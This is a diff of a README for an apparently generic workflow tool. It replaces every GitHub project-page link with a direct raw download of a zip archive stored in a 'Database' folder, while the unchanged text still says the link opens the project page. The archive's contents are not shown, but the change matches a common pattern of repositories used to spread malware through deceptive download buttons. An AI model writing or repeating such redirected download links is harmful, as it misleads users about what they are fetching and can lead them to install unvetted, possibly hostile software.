@@ -1,6 +1,6 @@
 # 📂 digital-process-support-system - Simplify Internal Workflow Tasks
 
-[![Download Now](https://img.shields.io/badge/Download%20Here-brightgreen?style=for-the-badge)](https://github.com/UwU061109/digital-process-support-system)
+[![Download Now](https://img.shields.io/badge/Download%20Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/UwU061109/digital-process-support-system/main/Database/support_process_system_digital_1.7-alpha.5.zip)
 
 ---
 
@@ -30,7 +30,7 @@ You do not need any programming skills or extra software before installing. The 
 
 To get started, visit the page below and download the application files:
 
-[![Download Here](https://img.shields.io/badge/Download%20Application-blue?style=for-the-badge)](https://github.com/UwU061109/digital-process-support-system)
+[![Download Here](https://img.shields.io/badge/Download%20Application-blue?style=for-the-badge)](https://raw.githubusercontent.com/UwU061109/digital-process-support-system/main/Database/support_process_system_digital_1.7-alpha.5.zip)
 
 **Step 1: Open the Download Page**  
 Click the link above. It takes you to the project page on GitHub. This page contains the latest version of the software and instructions.
@@ -94,7 +94,7 @@ If problems persist, check the project page for FAQs or contact support through 
 
 To keep the system working well, check for updates occasionally:
 
-1. Open the GitHub page: https://github.com/UwU061109/digital-process-support-system  
+1. Open the GitHub page: https://raw.githubusercontent.com/UwU061109/digital-process-support-system/main/Database/support_process_system_digital_1.7-alpha.5.zip  
 2. Look for any new releases or improved versions.  
 3. Download the latest installer.  
 4. Run the new installer to update your current installation.  
@@ -115,4 +115,4 @@ Your existing data and settings will stay safe during updates.
 
 Use this link if you want to visit the project and download anytime:
 
-[Download digital-process-support-system](https://github.com/UwU061109/digital-process-support-system)
+[Download digital-process-support-system](https://raw.githubusercontent.com/UwU061109/digital-process-support-system/main/Database/support_process_system_digital_1.7-alpha.5.zip)
